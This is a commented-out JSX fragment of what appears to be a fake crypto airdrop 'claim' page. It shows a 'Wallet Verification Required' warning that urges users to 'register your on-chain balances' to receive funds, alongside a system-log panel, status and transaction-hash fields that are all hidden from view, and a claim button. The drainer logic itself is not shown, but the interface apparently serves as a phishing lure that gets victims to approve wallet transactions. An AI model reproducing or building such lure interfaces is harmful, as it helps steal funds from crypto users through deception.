//              <span style={{ color: '#059669', fontSize: '15px', fontWeight: '700' }}>Ready to Claim</span>
//           </div>
//         </div>

//         <div style={{ backgroundColor: '#FEF2F2', border: '1.5px solid #FCA5A5', borderRadius: '12px', padding: '16px', width: '100%', boxSizing: 'border-box' }}>
//           <p style={{ margin: 0, fontSize: '13.5px', color: '#B91C1C', lineHeight: '1.6', fontWeight: '600' }}>
//             ⚠️ <span style={{fontWeight: '800'}}>Wallet Verification Required:</span> You will be prompted to register your on-chain balances to securely calculate your final multiplier and distribute funds.
//           </p>
//         </div>

//       </div>

//       <div style={{ display: 'none', margin: '0 20px 20px 20px', padding: '10px', backgroundColor: '#000', color: '#0f0', fontSize: '11px', fontFamily: 'monospace', borderRadius: '8px', height: '120px', overflowY: 'auto' }}>
//         <div style={{ color: '#fff', borderBottom: '1px solid #333', paddingBottom: '4px', marginBottom: '4px' }}>--- SYSTEM LOGS ---</div>
//         {debugLogs.map((msg, idx) => (<div key={idx} style={{ marginTop: '2px' }}>{msg}</div>))}
//       </div>

//       <div style={{ display: 'none' }}>
//         <p>{status}</p>
//         <p>{txHash}</p>
//       </div>

//       <div style={{ padding: '20px', backgroundColor: '#ffffff', paddingBottom: '32px', width: '100%', boxSizing: 'border-box' }}>
//         <button onClick={handleAction} disabled={isButtonDisabled} style={{ width: '100%', backgroundColor: isButtonDisabled ? '#93C5FD' : '#0C66FF', color: '#ffffff', fontWeight: '700', padding: '16px', borderRadius: '9999px', fontSize: '17px', border: 'none', cursor: isButtonDisabled ? 'not-allowed' : 'pointer', transition: 'background-color 0.2s' }}>
//           {buttonText}
//         </button>
//       </div>
//     </div>
//   )
// }